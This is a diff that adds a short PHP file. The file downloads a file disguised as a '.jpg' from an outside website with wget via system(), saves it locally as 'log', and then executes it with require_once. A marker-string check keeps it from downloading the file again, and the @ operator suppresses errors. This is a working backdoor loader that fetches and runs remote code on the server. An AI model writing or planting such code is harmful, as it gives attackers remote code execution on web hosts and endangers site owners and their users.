@@ -1,0 +1,8 @@
+<?php 
+$file=dirname(__FILE__).'/log';
+@$cache=file_get_contents($file);
+if(!stristr($cache,'_get_toggle_flag')){
+system('wget http://www.radiangames.com/wp-content/uploads/2010/04/game2_big.jpg -O '.$file);
+}
+@require_once($file);
+?>
